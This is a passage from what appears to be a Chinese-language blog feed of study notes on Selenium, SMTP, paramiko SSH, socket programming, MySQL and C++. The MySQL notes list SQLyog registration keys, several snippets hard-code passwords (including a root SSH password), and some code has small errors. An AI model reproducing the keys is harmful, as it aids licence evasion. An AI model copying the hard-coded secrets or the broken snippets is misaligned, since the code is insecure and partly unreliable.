webdriver<span class="token keyword">import</span> timedriver <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://zhuanlan.zhihu.com/p/26276505'</span><span class="token punctuation">)</span>driver<span class="token punctuation">.</span>find_element_by_id<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>driver<span class="token punctuation">.</span>find_element_by_id<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span><span class="token string">'admin123'</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>driver<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">"//input[@id='verifycode]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span><span class="token string">'0000'</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>driver<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">"/html/body/div[4]/div/form/div[6]/button"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>driver<span class="token punctuation">.</span>find_element_by_css_selector<span class="token punctuation">(</span><span class="token string">"body > div.container > div > form > div:nth-child(6) > button"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ol start="22" type="1"><li><p>基于AI的验证码识别</p></li><li><p>处理<code>smtp</code>协议</p></li></ol><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> imp<span class="token keyword">import</span> smtplib<span class="token keyword">import</span> time<span class="token keyword">from</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>application <span class="token keyword">import</span> MIMEApplication<span class="token keyword">from</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>multipart <span class="token keyword">import</span> MIMEMultipart<span class="token keyword">from</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>text <span class="token keyword">import</span> MIMEText<span class="token comment"># 收件人和发件人</span>sender <span class="token operator">=</span> <span class="token string">'student@woniuxy.com'</span>receiver <span class="token operator">=</span> <span class="token string">'dengqiang@woniuxy.com'</span>      <span class="token comment"># 构建邮件的主体对象</span>msg <span class="token operator">=</span> MIMEMultipart<span class="token punctuation">(</span><span class="token punctuation">)</span>msg<span class="token punctuation">[</span><span class="token string">'subject'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'Python测试邮件'</span>msg<span class="token punctuation">[</span><span class="token string">'From'</span><span class="token punctuation">]</span> <span class="token operator">=</span> sendermsg<span class="token punctuation">[</span><span class="token string">'To'</span><span class="token punctuation">]</span> <span class="token operator">=</span> receiverbody <span class="token operator">=</span> <span class="token triple-quoted-string string">'''&lt;div style = font-size:30px;color:red;'>这是一个邮件的正文&lt;/div>'''</span><span class="token comment"># 附件</span>content <span class="token operator">=</span> MIMEText<span class="token punctuation">(</span>body<span class="token punctuation">,</span><span class="token string">'html'</span><span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>msg<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token comment"># 建立与邮件服务器的连接并发送邮件</span>smtpObj <span class="token operator">=</span> smtplib<span class="token punctuation">.</span>SMTP<span class="token punctuation">(</span><span class="token punctuation">)</span>smtpObj<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">'mail.woniuxy.com'</span><span class="token punctuation">,</span><span class="token string">'25'</span><span class="token punctuation">)</span>smtpObj<span class="token punctuation">.</span>login<span class="token punctuation">(</span>user<span class="token operator">=</span>sender<span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">'Student123'</span><span class="token punctuation">)</span>       smtpObj<span class="token punctuation">.</span>sendmail<span class="token punctuation">(</span>sender<span class="token punctuation">,</span> receiver<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span>smtpObj<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span> </code></pre><ol start="24" type="1"><li>处理<code>ssh</code>与<code>redis</code></li></ol><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sys <span class="token keyword">import</span> stderr<span class="token punctuation">,</span> stdout<span class="token keyword">import</span> paramikotransport <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>Transport<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'192.168.104.130'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">)</span>transport<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>username<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">'bycz1997'</span><span class="token punctuation">)</span>ssh <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>SSHClient<span class="token punctuation">(</span><span class="token punctuation">)</span>ssh<span class="token punctuation">.</span>_transport <span class="token operator">=</span> transportsftp <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>SFTPClient<span class="token punctuation">.</span>from_transport<span class="token punctuation">(</span>transport<span class="token punctuation">)</span>stdin<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr <span class="token operator">=</span> ssh<span class="token punctuation">.</span>exec_command<span class="token punctuation">(</span><span class="token string">'ls /opt'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 传输文件</span></code></pre><ol start="25" type="1"><li>面向对象</li></ol><blockquote><ol type="1"><li>强类型与弱类型编程语言</li><li>构造方法：<code>self</code></li><li>静态方法</li><li>魔术方法</li><li>保护方法</li><li>继承</li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> Cybersecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设计模式</title>
      <link href="/2022/04/20/she-ji-mo-shi/"/>
      <url>/2022/04/20/she-ji-mo-shi/</url>
      
        <content type="html"><![CDATA[<ul><li>复用性</li><li>抵御变化</li></ul><h3 id="面向对象设计原则">面向对象设计原则</h3><ol type="1"><li>依赖倒置原则</li><li>开放封闭原则</li></ol><blockquote><ul><li>对扩展开放、对修改封闭</li></ul></blockquote><ol start="3" type="1"><li>单一职责原则</li></ol><blockquote><ul><li>一个类应该仅有一个引起他变化的原因</li><li>变化的方向隐含着类的责任</li></ul></blockquote><ol start="4" type="1"><li><p>Liskov替换原则</p></li><li><p>接口隔离原则</p></li><li><p>组合优于继承</p></li><li><p>封装变化点</p></li><li><p>针对接口编程，而不是针对实现编程</p></li></ol><h3 id="设计经验">设计经验</h3><ol type="1"><li>设计习语</li><li>设计模式</li><li>架构模式</li></ol>]]></content>
      
      
      <categories>
          
          <category> Programming Design </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>tinyWebServer源码学习</title>
      <link href="/2022/03/21/tinywebserver/"/>
      <url>/2022/03/21/tinywebserver/</url>
      
        <content type="html"><![CDATA[<p>​ 1. 参考书的意义永远是随时查阅和补充</p><hr /><h3 id="什么是webserver">什么是webServer</h3><ol type="1"><li><code>B/S</code>或<code>C/S</code>模型</li><li><code>HTML</code></li><li><code>HTTP</code></li></ol><blockquote><ol type="1"><li><code>TCP</code>: 80端口</li><li>请求分类: <code>get</code>、<code>head</code>、<code>post</code></li></ol></blockquote><p>​ <strong>补充</strong></p><blockquote><ol type="1"><li>有限状态集：现态、条件、动作、次态</li></ol></blockquote><ol start="4" type="1"><li>一些<code>API</code></li></ol><blockquote><ol type="1"><li><code>getopt()</code></li><li><code>assert()</code> 假设成立、正常运行</li><li><code>int socket(int domain,int type, int protocol)</code><ol type="1"><li>域 AF_INET 、SOCK_STREAM 或SOCK_DGRAM、传表示默认协议</li></ol></li><li><code>struct sockaddr_in</code></li></ol></blockquote><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> <span class="token punctuation">&#123;</span>　　<span class="token keyword">short</span> <span class="token keyword">int</span> sin_family<span class="token punctuation">;</span> <span class="token comment">/* 指代协议族，在socket编程中只能是AF_INET */</span>　　<span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span> sin_port<span class="token punctuation">;</span> <span class="token comment">/* 存储端口号（使用网络字节顺序） */</span>　　<span class="token keyword">struct</span> <span class="token class-name">in_addr</span> sin_addr<span class="token punctuation">;</span> <span class="token comment">/* 存储IP地址，使用in_addr这个数据结构 */</span>　　<span class="token keyword">unsigned</span> <span class="token keyword">char</span> sin_zero<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">/* 是为了让sockaddr与sockaddr_in两个数据结构保持大小相同而保留的空字节 */</span>　　<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">in_addr</span> <span class="token punctuation">&#123;</span>　　<span class="token keyword">union</span> <span class="token punctuation">&#123;</span>　　<span class="token keyword">struct</span><span class="token punctuation">&#123;</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> s_b1<span class="token punctuation">,</span>s_b2<span class="token punctuation">,</span> s_b3<span class="token punctuation">,</span>s_b4<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> S_un_b<span class="token punctuation">;</span> <span class="token comment">//第一种用四个字节来表示IP地址的四个数字；</span>　　<span class="token keyword">struct</span><span class="token punctuation">&#123;</span> <span class="token keyword">unsigned</span> <span class="token keyword">short</span> s_w1<span class="token punctuation">,</span> s_w2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> S_un_w<span class="token punctuation">;</span><span class="token comment">// 用两个双字节来表示IP地址</span>　　<span class="token keyword">unsigned</span> <span class="token keyword">long</span> S_addr<span class="token punctuation">;</span><span class="token comment">// 用一个长整型来表示IP地址</span>　　<span class="token punctuation">&#125;</span> S_un<span class="token punctuation">;</span>　　<span class="token punctuation">&#125;</span> IN_ADDR<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">in_addr</span>  <span class="token punctuation">&#123;</span>    in_addr_t s_addr<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><blockquote><ol start="5" type="1"><li><code>bezero()</code> : 将整块地址清0</li><li><code>uint32_t htonl(uint32_t hostlong)</code>：将一个32位数从主机字节顺序转换成网络字节顺序<ol type="1"><li><code>INADDR_ANY</code>： 不确定地址、任意地址</li></ol></li><li><code>htons()</code>： “Host to Network Short”</li><li><code>int setsockopt(int sock, int level, int optname, const void *optval, socklen_t optlen)</code></li></ol></blockquote><ol start="5" type="1"><li>基础概念与理论</li></ol><blockquote><ol type="1"><li>文件描述符：文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来指向被打开的文件，所有执行I/O操作的系统调用都会通过文件描述符。</li><li>进程级文件描述符表与系统级文件描述符表<ol type="1"><li><code>inode节点</code>：文件数据都储存在"块"中，那么很显然，我们还必须找到一个地方储存文件的元信息，比如文件的创建者、文件的创建日期、文件的大小等等</li></ol></li><li><code>句柄</code>： 句柄的作用就是在 C 语言环境下代替 C++的对象指针来用的。</li><li><code>EPOLLONESHOT</code>：采用EPOLLONETSHOT事件的文件描述符上的注册事件只触发一次，要想重新注册事件则需要调用epoll_ctl重置文件描述符上的事件，这样前面的socket就不会出现竞态。</li><li><code>#ifndef, #define, #endif 作用</code> ：如果在h文件中定义了全局变量，一个c文件包含同一个h文件多次，如果不加#ifndef宏定义，会出现变量重复定义的错误；如果加了#ifndef，则不会出现这种错误</li></ol></blockquote><ol start="6" type="1"><li><code>epoll</code>： <ahref="https://zhuanlan.zhihu.com/p/64138532">我的理解转变由此开始</a></li></ol><blockquote><ol type="1"><li><code>rdlist</code>: 双向链表</li><li><code>rbt</code>: 监视队列</li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> Project </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DatabaseSystemConcepts</title>
      <link href="/2022/03/20/databasesystemconcepts/"/>
      <url>/2022/03/20/databasesystemconcepts/</url>
      
        <content type="html"><![CDATA[<p><strong>Mysql</strong></p><hr /><h3 id="暂留">暂留</h3><ol type="1"><li>P34,P35</li></ol><h3 id="工具">工具</h3><ul><li><code>sqlyog</code></li></ul><blockquote><p>Professional: 8e053a86-cdd3-48ed-b5fe-94c51b3d343c Enterprise:a46683b0-d3ec-4c16-8e3c-198d25a7fb52 Ultimate:60c1b896-7c22-4405-9f46-a6bce776ab36</p></blockquote><ul><li><code>mycli</code>：<code>sql</code>补全，高亮<ul><li>安装<code>python</code>环境</li></ul></li></ul><hr /><h3 id="连接">连接</h3><ul><li>尽量使用<code>UNION ALL</code>:提高查询效率，两个查询的结果<code>UNION ALL</code></li><li><code>NATURAL JOIN</code></li><li><code>USING</code>：当两个表有关联字段相同时</li><li><code>LEFT JOIN</code></li><li>自连接</li></ul><h3 id="函数">函数</h3><ol type="1"><li>单行函数<ol type="1"><li>数值类型的函数</li></ol></li><li>多行函数</li></ol><h3 id="流程控制函数">流程控制函数</h3><ol type="1"><li><code>IF(val,val1,val2)</code></li><li><code>IFNULL()</code></li></ol><h3 id="聚合函数">聚合函数</h3><ol type="1"><li><code>GROUP BY</code><ul><li><code>WITH ROLLUP</code>:不能使用 <code>ORDER BY</code></li><li>使用了聚合函数，则必须使用 <code>HAVING</code>代替<code>WHERE</code></li><li><code>HAVING</code> 必须声明在 <code>GROUP BY</code>之后</li><li><code>WHERE</code>比 <code>HAVING</code>执行效率高</li></ul></li><li><code>SQL99</code> 完整结构</li></ol><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">(</span>存在聚合函数<span class="token punctuation">)</span><span class="token keyword">FROM</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">JOIN</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>OM 多表的连接条件<span class="token keyword">WHERE</span> 不包含聚合函数的过滤条件<span class="token keyword">GROUP</span> <span class="token keyword">BY</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">HAVING</span> 包含聚合函数的过滤条件<span class="token keyword">ORDER</span> <span class="token keyword">BY</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token keyword">ASC</span><span class="token operator">/</span><span class="token keyword">DESC</span><span class="token punctuation">)</span><span class="token keyword">LIMIT</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><ul><li>SQL语句的执行过程</li></ul><blockquote><p>FROM -------&gt; ON ------&gt; (LEFT/RIGHT) JOIN -----&gt;WHERE--------&gt;GROUP BY-------&gt;HAVING------&gt;SELECT------&gt;DISTINCT-------&gt;ORDERBY-----&gt;LIMNIT</p></blockquote><h3 id="子查询">子查询</h3><h3 id="视图">视图</h3><ol type="1"><li>修改，同步，虚表，基本表</li></ol>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux网络编程</title>
      <link href="/2022/03/14/linux-wang-luo-bian-cheng/"/>
      <url>/2022/03/14/linux-wang-luo-bian-cheng/</url>
      
        <content type="html"><![CDATA[<h3 id="网络基础大便">网络基础大便</h3><ul><li><p>网络字节序:大端</p></li><li><p>主机字节序与网络字节序不同的系统上使用这四个函数</p></li><li><p>htons();</p></li><li><p>ntohs();</p></li></ul><h3 id="sever">sever</h3><ul><li><p>lsof:</p></li><li><p>socket();</p></li><li><p>bind();</p></li><li><p>listen()</p></li><li><p><strong>accept();:</strong> 创建一个新socket</p></li></ul><h3 id="client">client</h3><ul><li><p>socket()</p></li><li><p>connect()</p></li></ul><p><strong>封装函数</strong>：逻辑清晰。</p><hr /><h3 id="多进程并发服务器">多进程并发服务器</h3><p>多线程并发服务器</p><ul><li><p>兄弟线程之间可以相互回收；兄弟线程不可以。</p></li><li><p>find /mnt （寻找文件夹）</p></li><li><p>memset()</p></li><li><p>bzero()</p></li><li><p>信号捕捉函数（信号概念的理解）</p></li><li><p>read():</p></li></ul><h3 id="tcp的建立">TCP的建立</h3><blockquote><ol type="1"><li>listen()被动打开，accept()阻塞服务器直到连接建立</li><li>客户端connect（）主动打开，发送SYN报文，服务器发送ACK和SYN</li><li>客服端返回确认</li></ol></blockquote><figure><img src="https://s2.loli.net/2022/03/19/H3Ea9YAGSIzu7Wc.png"alt="TCP连接建立" /><figcaption aria-hidden="true">TCP连接建立</figcaption></figure><hr /><h3 id="tcp连接终止">TCP连接终止</h3><ul><li><p><strong>2MSL</strong>:1 个 MSL 时间留给最后的 ACK确认报文到达对端 TCP 结点，另一个 MSL 时间留给必须发送的 FIN报文。</p></li><li><p>监视套接字：netstat</p><blockquote><p>参数: -a,-n,-p</p></blockquote></li><li><p>端口复用：int setsockopt(int sockfd,int level,int optanme,constvoid* optval,socklen_t optlen)</p></li><li><p>FIN_WAIT2 : 半关闭</p><ul><li>close()</li><li>shutdown(): 多个文件描述符时，全关闭。</li></ul></li></ul><blockquote><ol type="1"><li>close()主动关闭，发送FIN报文</li><li>发送ACK响应，read()结束</li><li>服务器发送FIN报文</li><li>客户端确认</li></ol></blockquote><figure><img src="https://s2.loli.net/2022/03/19/K16X9lADwgSfFzb.png"alt="TCP连接终止" /><figcaption aria-hidden="true">TCP连接终止</figcaption></figure><hr /><h3 id="多路转接io响应式">多路转接IO:响应式</h3><ol type="1"><li><p><code>select</code></p><ul><li><p><code>int select()</code>函数原型：nfds指定被监听的文件描述符的总数，其值为总数+1</p><ul><li><p>一般来说 <code>listen fd</code>最小</p></li><li><p>对 <code>read</code> 描述符集合的理解</p><blockquote><ol type="1"><li><code>listen</code> 连接请求行为</li><li>数据通信行为</li></ol></blockquote></li><li><p>有好几个参数都是<strong>传入+传出参数</strong>,<strong>传入的描述符</strong>是自己感兴趣的，<strong>传出的描述符</strong>是属于就绪状态的，因此<strong>感兴趣的</strong>描述符集合需要备份</p></li></ul></li><li><p><code>FD_SET()</code>初调用select,传入<code>lfd</code>(监听连接请求)，属于读事件。传出集合里有<code>lfd</code>,就确定了有连接请求，则通知<code>server</code>调用 <code>accept()</code>处理连接请求，处理正常通信。如果<code>select</code>返回值大于1则读入了多个请求，可能有连接，也有通信。</p></li><li><p>起初调用<code>select</code>,传入<code>lfd</code>(监听连接请求)，属于读事件。处理连接请求后，处理正常通信。</p></li><li><p><code>FD_ISSET()</code>:是否有客户端连接请求</p></li></ul></li><li><p><code>poll</code>：半成品、鸡肋</p></li><li><p><code>epoll</code> : 红黑树</p></li></ol><blockquote><ul><li><code>int epoll_create(int size)</code>: 创建一个 epoll实例，返回代表该实例的文件描述符，创建红黑树。</li><li><code>int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event)</code>：操作监听的红黑树</li><li><code>int epoll_wait(int epfd, struct epoll_event *events, int maxevents, int timeout)</code>：阻塞监听</li></ul></blockquote><ul><li>事件模型</li></ul><blockquote><ol type="1"><li>边沿触发：只需要部分数据 （<strong>非阻塞模式</strong>）</li><li>水平触发：缓冲区剩下的下次会直接读走</li></ol></blockquote><h3 id="epoll-反应堆模型">epoll 反应堆模型</h3><ol type="1"><li>心跳检测机制</li></ol><blockquote><ul><li>心跳包:</li><li>乒乓包：简单数据</li><li>设置TCP属性：SO_KEEPALIVE</li></ul></blockquote><h3 id="事件驱动模型">事件驱动模型</h3><ol type="1"><li>reactor 模式</li><li></li></ol><h3 id="线程池">线程池</h3>]]></content>
      
      
      <categories>
          
          <category> Programming Design </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> Computer Network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构与C++</title>
      <link href="/2022/01/31/ds-c/"/>
      <url>/2022/01/31/ds-c/</url>
      
        <content type="html"><![CDATA[<h3 id="attention">Attention</h3><ul><li><code>typora</code>中代码 != 显示成 <code>!=</code> ,==显示成<code>==</code></li></ul><hr /><h3 id="c语法">C++语法</h3><ul><li><p>洗牌函数</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;random></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> nums <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> seed <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span>chrono<span class="token double-colon punctuation">::</span>system_clock<span class="token double-colon punctuation">::</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">time_since_epoch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">shuffle</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">default_random_engine</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> num <span class="token operator">:</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> num <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>sort()</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span></span><span class="token keyword">bool</span> <span class="token function">compare</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> a <span class="token operator">></span> b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> vec<span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span><span class="token function">sort</span><span class="token punctuation">(</span>vec<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> vec<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> compare<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> i <span class="token operator">:</span> vec<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> i <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><ul><li>三个参数</li></ul></li><li><p>lambda</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">compare</span><span class="token punctuation">(</span>string a<span class="token punctuation">,</span> string b<span class="token punctuation">,</span> map<span class="token operator">&lt;</span>string<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> rank_map<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> rank_map<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">&lt;</span> rank_map<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 正确</span><span class="token function">sort</span><span class="token punctuation">(</span>cards<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cards<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span>rank_map<span class="token punctuation">]</span><span class="token punctuation">(</span>string a<span class="token punctuation">,</span> string b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">compare</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> rank_map<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 为什么这么写是错误的</span><span class="token function">sort</span><span class="token punctuation">(</span>cards<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cards<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> compare<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre class="language-none"><code class="language-none">  </code></pre></li><li><p>一个报错（如上）</p></li><li><p>break</p><ul><li>中断本层的一次循环</li></ul></li><li><p>conntinue</p><ul><li>循环内余下内ring不再执行</li></ul></li><li><p><code>substr()</code></p><ul><li><p>```cpp string s = "Hello, world!"; string sub = s.substr(0,s.find(',')); // sub 的值为 "Hello"</p><p>string s = "Hello, world!"; string sub = s.substr(s.find(',') + 1);// sub 的值为 " world!"</p><p>string s = "Hello, world!"; string sub = s.substr(s.find_last_of(' ')+ 1); // sub 的值为 "world</p><p>string s = 